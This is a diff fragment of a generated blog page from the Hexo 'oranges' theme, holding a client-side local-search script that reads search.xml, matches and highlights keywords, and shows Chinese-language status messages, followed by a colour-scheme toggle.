+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
